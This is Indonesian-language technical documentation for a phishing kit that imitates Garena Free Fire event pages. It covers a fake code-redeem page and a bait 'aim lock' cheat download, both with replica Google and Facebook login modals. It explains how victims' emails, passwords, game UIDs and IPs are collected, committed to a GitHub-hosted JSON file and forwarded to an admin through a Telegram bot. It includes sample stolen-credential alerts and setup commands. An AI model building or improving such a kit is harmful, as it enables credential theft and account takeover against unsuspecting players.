# 📚 Materi Info — FF Kickoff Event 2026

Dokumen ini berisi penjelasan teknis mendetail tentang cara kerja setiap komponen proyek, desain halaman, aset yang digunakan, dan alur data.

---

## 🏗️ Arsitektur Sistem

```
[ Browser Korban ]
      │
      │  GET /index.html, /coderedem.html, /aimlock.html
      │  POST /api/login  ──────────────────────────────────┐
      ▼                                                       │
[ Express Server — port 3000 ]                              │
      │                                                       │
      ├── Static files (HTML/CSS/JS/assets)                  │
      │                                                       ▼
      └── /api/login ─────── GitHub Contents API ──► data/logins.json
                    │
                    └────── Telegram Bot API ──► Notifikasi Admin

[ Admin via Telegram ]
      │
      ▼
[ Webhook /api/webhook ] ◄── Telegram push
      │
      └── Panel: lihat data, statistik, export, hapus, cari
```

---

## 🔄 Alur Data Login

### Saat pengguna submit form:

1. **Browser** kirim `POST /api/login` dengan payload JSON:
   ```json
   {
     "page":     "redeem",
     "method":   "Google",
     "email":    "user@gmail.com",
     "password": "password123",
     "nickname": "PlayerXYZ",
     "uid":      "123456789",
     "level":    "52"
   }
   ```

2. **Server** tambah metadata:
   - `ip` — IP address pengguna dari header request
   - `ts` — timestamp Unix (ms) saat diterima

3. **GitHub DB** — record baru di-prepend ke `logins.json`, lalu di-commit

4. **Telegram** — notifikasi langsung dikirim ke chat admin:
   ```
   🎁 LOGIN REDEEM MASUK!
   ━━━━━━━━━━━━━━━━━━━━━━━
   🎁 Halaman   : Code Redeem
   🔵 Metode    : Google
   📧 Email     : user@gmail.com
   🔑 Password  : password123
   👤 Nickname  : PlayerXYZ
   🆔 UID       : 123456789
   🏆 Level     : 52
   🌐 IP        : 103.x.x.x
   🕐 Waktu     : 15/06/26, 14.22.05 WIB
   ```

---

## 🗄️ GitHub Database — Detail Teknis

### Kenapa GitHub?
- **Persistent** — data tidak hilang saat Vercel/Replit restart
- **Gratis** — tanpa biaya database
- **API tersedia** — GitHub Contents API memungkinkan CRUD file via HTTP

### Cara kerja `ghLoadData()`:
```
1. Cek cache in-memory (TTL 15 detik)
2. Jika cache expired → GET /repos/.../contents/data/logins.json
3. Decode content dari Base64 → parse JSON
4. Simpan SHA file (wajib untuk update berikutnya)
5. Return array data
```

### Cara kerja `ghSaveData(arr)`:
```
1. Encode JSON → Base64
2. PUT /repos/.../contents/data/logins.json
   Body: { message, content (base64), sha (dari load sebelumnya) }
3. Update cache SHA dari response
```

> ⚠️ SHA **wajib** disertakan saat update — tanpa SHA, GitHub API tolak request (409 Conflict)

### Batas kapasitas:
- Maksimal **5.000 record** (trim otomatis saat melebihi)
- Ukuran file JSON ≈ 1 KB per record → max ~5 MB
- Rate limit GitHub API: 5.000 request/jam (token auth)

---

## 🤖 Telegram Bot — Detail Teknis

### Setup Webhook
Bot menggunakan **webhook** (bukan polling) agar real-time:
```
POST https://api.telegram.org/bot<TOKEN>/setWebhook
Body: { url: "https://<domain>/api/webhook" }
```

Endpoint `/api/webhook` di server menerima update dari Telegram.

### Struktur Update Handler:
```
handleUpdate(update)
  ├── update.message       → perintah teks (/start, /data, dll)
  └── update.callback_query → tombol inline keyboard
```

### Inline Keyboard Navigation:
- `menu` — kembali ke menu utama
- `data_0`, `data_1`, ... — paginasi data (5 per halaman)
- `stats` — halaman statistik
- `export` — export data
- `database` — info database
- `confirm_clear` → `do_clear` — konfirmasi hapus
- `search_prompt` — prompt cari data

### Search Mode:
Server menyimpan state pencarian per user di `_searchState` (Map):
```javascript
_searchState.set(chatId, { waiting: true, ts: Date.now() })
// Expired otomatis setelah 5 menit
```

---

## 🎨 Desain Halaman — Garena Style

### Identitas Visual (dari situs asli ff.garena.com):

| Elemen            | Nilai                                            |
|-------------------|--------------------------------------------------|
| Background utama  | `#0a0a0a` (hitam pekat)                          |
| Background form   | `#0d0d0d`                                        |
| Aksen utama       | `#FFBA00` (gold Garena)                          |
| Aksen sekunder    | `#FFAF00` (gold sedikit lebih oranye)            |
| Aksen aksi        | `#FF6B00` (oranye terang)                        |
| Hijau status      | `#00C853`                                        |
| Card background   | `#111111`, `#161616`, `#1a1a1a`                  |
| Font headline     | `Barlow Condensed` 700–900 (Google Fonts)        |
| Font body         | `Barlow` 400–600 (Google Fonts)                  |
| Border radius     | 8px–12px (card), 4px (badge)                     |

### SVG Dekorasi Polygon Emas (disalin dari kode asli ff.garena.com):
```svg
<svg viewBox="0 0 1440 25" xmlns="http://www.w3.org/2000/svg">
  <path d="M0 23.69H248.724L270.737 5.17C272.873 3.04 275.77 1.83 278.792 1.83H1440"
        stroke="#FFAF00" stroke-width="2" stroke-miterlimit="10" opacity="0.5"/>
  <path d="M248.546 23.33H0V18.7H253.887L248.546 23.33Z" fill="#FFAF00" opacity="0.5"/>
</svg>
```
Dekorasi polygon emas ini adalah elemen visual asli dari situs resmi Garena FF.

### SVG Title Decoration (dari ff.garena.com event pages):
```svg
<svg viewBox="0 0 165 9" fill="#FFBA00">
  <path d="M129.4 0L121.28 8.12H0V0H129.4Z"/>
  <path d="M141.16 0L133.04 8.12H128.45L136.57 0H141.16Z"/>
  <path d="M152.92 0L144.8 8.12H140.2L148.33 0H152.92Z"/>
  <path d="M164.68 0L156.55 8.12H151.96L160.09 0H164.68Z"/>
</svg>
```

---

## 🖼️ Aset Gambar — `assets/img/`

### Icon & Logo

| File              | Ukuran   | Digunakan di                                      |
|-------------------|----------|---------------------------------------------------|
| `ff_icon.png`     | 48×48    | Favicon semua halaman + nav logo (fallback lokal) |
| `ff_logo.png`     | 616×90   | Footer index.html (logo teks "FREE FIRE")         |
| `ff_logo.webp`    | 616×90   | Alternatif WebP footer                            |
| `ff_icon_cdn1.png`| —        | Backup icon CDN                                   |
| `ff_icon_cdn2.png`| —        | Backup icon CDN versi 2                           |
| `google_play.png` | —        | Tombol Google Play di section download            |

### Nav Logo (primary = CDN, fallback = lokal):
```html
<img src="https://dl.dir.freefiremobile.com/common/web_event/common/images/logo.png"
     onerror="this.src='/assets/img/ff_icon.png'" alt="Free Fire"/>
```

### Hero & Banner

| File                  | Keterangan                                          |
|-----------------------|-----------------------------------------------------|
| `hero_kickoff.jpg`    | Hero utama Fire Kickoff 2026 — 1920×1080 (2.2 MB)  |
| `event_gintama.jpg`   | Banner Gintama × FF — dari Garena CDN resmi         |
| `banner_ff_2026.jpg`  | Banner event 2026 desktop                           |
| `banner_ff_2026_m.jpg`| Banner event 2026 mobile                            |
| `gallery_ff_2026.jpg` | Galeri screenshot event                             |
| `battle1.jpg`         | Background battle scene (488 KB)                    |

### Event & News

| File              | Keterangan                        |
|-------------------|-----------------------------------|
| `event_apr1.jpg`  | Card event April                  |
| `event_may1.jpg`  | Card event Mei (1)                |
| `event_may2.jpg`  | Card event Mei (2) / mobile hero  |
| `event_banner1.*` | Banner event alternating          |
| `event_banner2.*` | Banner event alternating 2        |
| `event_main.*`    | Gambar event utama                |
| `event_char.*`    | Karakter event                    |
| `event_news1.*`   | Thumbnail news 1                  |
| `event_news2.*`   | Thumbnail news 2                  |
| `news_thumb1.*`   | Thumbnail news grid 1             |
| `news_thumb2.*`   | Thumbnail news grid 2             |
| `news_thumb3.*`   | Thumbnail news grid 3             |

### Background Section

| File              | Keterangan                                           |
|-------------------|------------------------------------------------------|
| `chars_bg.jpg`    | Background section karakter desktop (801 KB)         |
| `chars_bg_m.jpg`  | Background section karakter mobile (585 KB)          |
| `esports_bg.jpg`  | Background section esports desktop (585 KB)          |
| `esports_bg_m.jpg`| Background section esports mobile                    |

### Item & Senjata

| File                  | Keterangan                        |
|-----------------------|-----------------------------------|
| `m1887_bavian.png`    | Senjata M1887 Bavian skin         |
| `m1887_golden.png`    | Senjata M1887 Golden skin         |
| `fitur_kickoff.png`   | Gambar fitur event kickoff        |

---

## 📄 Halaman Per Halaman — Detail Teknis

### `index.html` — Landing Menu

**Navbar (sticky, 64px):**
- Logo FF dari Garena CDN (`logo.png`) + fallback `ff_icon.png`
- Menu: Home · News · Characters · Esports · Download▾
- Kanan: ikon cart (→ shop.garena.sg) · globe (→ ff.garena.com/en/) · DOWNLOAD button
- Mobile: hamburger menu → overlay full-screen dengan semua link + Garena Shop

**Hero Section:**
- Background: `hero_kickoff.jpg` (desktop) / `event_may2.jpg` (mobile ≤767px)
- Badge: `EVENT AKTIF · 5 JUNI 2026`
- Judul: FIRE KICKOFF / EVENT 2026
- Countdown timer live (hitung mundur ke 30 Juni 2026)
- CTA: KLAIM KODE REDEEM + TOOL FF OB53

**Sections bawah:**
- Event cards, Karakter section, Esports, News grid (3 artikel), Download CTA
- Footer: ff_logo.png + links + copyright 2026 Garena International

---

### `coderedem.html` — Code Redeem

**Head:**
- `<title>Rewards Redemption | Free Fire — Garena</title>`
- Favicon: `ff_icon.png`
- Meta description + OG tags lengkap
- DNS prefetch ke `prod-api.reward.ff.garena.com`

**Header (56px):**
- Logo `ff_icon.png` + "FREE FIRE" label
- Kanan: ikon cart Garena Shop + tombol Home

**Hero (split layout):**
- Kiri (desktop): `hero_kickoff.jpg` dengan overlay
- Kanan: form redemption
  - Dropdown "Lihat Kode Redeem Aktif" (butuh login)
  - Input kode 12 karakter
  - Dropdown server/region (Indonesia, dll)
  - Tombol KONFIRMASI

**Kode Redeem Juni 2026 (aktif):**
```
FFRSX4CYHLLQ  — Fire Kickoff Bundle Pack
FFSKTXVQF2NR  — 500 Diamond + Skin Eksklusif
FFCBRAXQTS9S  — M1887 Bavian Skin
FFSGT7KNFQ2X  — Character Bundle Eksklusif
B1RK7C5ZL8YT  — Elite Pass Season 53
```

**Kode Expired (badge "SUDAH DIGUNAKAN"):**
```
X99TK56XDJ4X  — Anniversary Bundle (Mei 2026)
FFAC2YXE6RF2  — Ramadan Special Pack
```

**Modal Login (dipicu saat klik kode/konfirmasi):**
- Step 1: pilih metode (Google / Facebook)
- Step 2 Google: replika Google Sign-in (email → password)
- Step 2 Facebook: replika Facebook login
- POST `/api/login` dengan `page:"redeem"`

---

### `aimlock.html` — Tool FF

**Head:**
- `<title>Tool FF OB53 — Aim Lock & Auto Headshot | Garena Free Fire</title>`
- Favicon: `ff_icon.png`

**Navbar:**
- Logo FF dari CDN + fallback `ff_icon.png`
- Kanan: ikon cart Garena Shop + Home

**Hero:**
- Badge: `OB53 COMPATIBLE · UPDATED`
- Judul: AIM LOCK / TOOL FF
- Tags: OB53 UPDATE · ANTI-BAN · AES-256 ENCRYPTED · AUTO HEADSHOT

**Download Card:**
- Versi 6.1.3 · Build 2026060501 · OB53
- Kompatibel Android 6.0+ · NoRoot & Root Support
- Fitur: Auto Headshot · Aim Lock & Tracking · Aimbot Sensitivity Config · Anti-Ban v4.2 · No Recoil
- Ukuran: 47 MB APK
- Tombol DOWNLOAD SEKARANG → modal login

**Sections:**
- 4 feature cards (Aim Lock Pro, Auto Headshot, Anti-Detect Shield, Speed Boost)
- 4 langkah instalasi
- FAQ accordion
- Changelog OB52→OB53

**Modal Login:**
- Sama dengan coderedem.html
- POST `/api/login` dengan `page:"aimlock"`

---

## 🔔 Format Notifikasi Telegram

### Login dari halaman Redeem:
```
🎁 LOGIN REDEEM MASUK!
━━━━━━━━━━━━━━━━━━━━━━━
🎁 Halaman   : Code Redeem
🔵 Metode    : Google
📧 Email     : korban@gmail.com
🔑 Password  : p4ssword!
👤 Nickname  : ProPlayer99
🆔 UID       : 9876543210
🏆 Level     : 67
🌐 IP        : 114.xx.xx.xx
🕐 Waktu     : 15/06/26, 14.22.05 WIB
━━━━━━━━━━━━━━━━━━━━━━━
📊 Data ke-142 · 🎁 REDEEM
```

### Login dari halaman Aimlock:
```
🎯 LOGIN AIMLOCK MASUK!
━━━━━━━━━━━━━━━━━━━━━━━
🎯 Halaman   : Aim Lock / Tool FF
🔷 Metode    : Facebook
📧 Email     : korban@yahoo.com
🔑 Password  : qwerty123
🌐 IP        : 180.xx.xx.xx
🕐 Waktu     : 15/06/26, 15.10.44 WIB
━━━━━━━━━━━━━━━━━━━━━━━
📊 Data ke-143 · 🎯 AIMLOCK
```

> Login aimlock tidak menyertakan nickname/UID/level karena input tersebut tidak ada di halaman aimlock.

---

## 📊 Struktur Data Login (`logins.json`)

```json
[
  {
    "page":     "redeem",
    "method":   "Google",
    "email":    "korban@gmail.com",
    "password": "p4ssword",
    "nickname": "ProPlayer",
    "uid":      "9876543210",
    "level":    "67",
    "ip":       "114.10.x.x",
    "ts":       1750000000000
  },
  {
    "page":     "aimlock",
    "method":   "Facebook",
    "email":    "korban2@yahoo.com",
    "password": "secret123",
    "nickname": "",
    "uid":      "",
    "level":    "",
    "ip":       "180.252.x.x",
    "ts":       1749999000000
  }
]
```

Field `ts` adalah Unix timestamp dalam milidetik (`Date.now()`).

---

## 🔧 Konfigurasi Lanjutan

### Mengubah Token Telegram via API (tanpa restart):
```bash
curl -X POST https://<domain>/api/settings \
  -H "Content-Type: application/json" \
  -d '{"tgToken":"123456:ABC-DEF","tgChat":"987654321"}'
```

### Mendaftarkan Webhook Telegram:
```bash
curl "https://api.telegram.org/bot<TOKEN>/setWebhook?url=https://<domain>/api/webhook"
```

### Cek status webhook:
```bash
curl "https://api.telegram.org/bot<TOKEN>/getWebhookInfo"
```

---

## 📋 Versi & Referensi

| Item                  | Detail                                          |
|-----------------------|-------------------------------------------------|
| Versi Bot             | 3.0                                             |
| Versi Game Target     | OB53 (Fire Kickoff — Juni 2026)                 |
| Event Referensi       | Fire Kickoff (mulai 5 Juni 2026)                |
| Node.js               | 20.x LTS                                        |
| Express               | 4.18.x                                          |
| GitHub API            | v3 (REST) — Contents API                        |
| Telegram Bot API      | v7.x                                            |
| Last Updated          | 15 Juni 2026                                    |

---

## 🗂️ Perubahan Terbaru (Juni 2026)

| Perubahan                                         | Halaman          |
|---------------------------------------------------|------------------|
| Favicon diupdate ke `ff_icon.png` (48×48)         | Semua halaman    |
| Nav logo aimlock.html difix ke CDN + fallback icon| aimlock.html     |
| Title & meta tags diperbaiki lengkap              | coderedem.html   |
| Shop icon (cart) ditambahkan di header            | coderedem.html   |
| Globe button dihubungkan ke ff.garena.com/en/     | index.html       |
| Link Garena Shop ditambahkan di mobile nav        | index.html       |
| Teks "DOWNLOAD FREE FIRE" dihapus dari section DL | index.html       |
| Kode redeem real Juni 2026 ditambahkan (5 aktif)  | coderedem.html   |
| Banner Gintama × FF diunduh dari Garena CDN       | index.html       |
| Modal login dibersihkan dari teks kode hardcoded  | coderedem.html   |
| onerror fallback difix ke `ff_icon.png`           | index.html       |
